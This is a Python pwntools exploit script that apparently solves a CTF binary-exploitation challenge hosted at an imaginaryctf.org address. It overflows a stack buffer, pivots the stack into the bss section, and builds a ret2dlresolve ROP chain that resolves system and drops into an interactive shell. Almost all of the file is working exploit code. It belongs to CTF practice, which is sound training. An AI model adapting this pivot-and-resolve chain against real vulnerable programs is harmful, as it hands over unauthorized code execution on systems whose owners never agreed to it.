#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('vuln')

host = args.HOST or 'minimal.chal.imaginaryctf.org'
port = int(args.PORT or 42042)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+50
continue
'''.format(**locals())

# -- Exploit goes here --
OFFSET = cyclic_find(0x6161616161616163,n=8)

io = start()

#########################
# 1: Stack pivot to bss #
#########################
p = b'A'* (OFFSET-8)
p += p64(exe.bss()+0x900)
p += p64(exe.sym.main + 12)

io.sendline(p)

####################
# 2: ret2dlresolve #
####################
# Create the fake structures:
# fake relocation struct: pointer to got + index in symbol table + ...
# fake symbol struct: offset in string table + ...
# fake string
d = Ret2dlresolvePayload(exe, symbol="system", args=[], data_addr=exe.bss()+0x900+0x18)
rop = ROP(exe)
rop.raw(b'C'*OFFSET)  
# set the requested arguments and jump to resolver in plt
rop.ret2dlresolve(d)
rop.raw(d.payload)

print(rop.dump(base=exe.bss()+0x900-8))

io.sendline(rop.chain())

io.interactive()

